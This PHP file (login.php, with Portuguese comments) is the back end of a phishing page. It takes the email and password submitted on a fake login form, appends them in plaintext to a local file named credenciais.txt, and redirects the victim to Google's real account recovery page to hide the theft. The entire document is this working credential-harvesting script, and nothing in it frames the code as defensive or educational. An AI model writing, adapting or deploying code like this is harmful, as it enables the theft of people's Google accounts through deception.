<?php
// login.php

// Verifica se os campos foram enviados corretamente
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $senha = isset($_POST['senha']) ? $_POST['senha'] : '';

    // Salva os dados em um arquivo de texto local
    file_put_contents("credenciais.txt", "Email: " . $email . " | Senha: " . $senha . "\n", FILE_APPEND);

    // Redireciona o usuário para o login oficial do Google
    header("Location: https://accounts.google.com/signin/v2/recoveryidentifier");
    exit();
} else {
    echo "Acesso inválido.";
}
?>
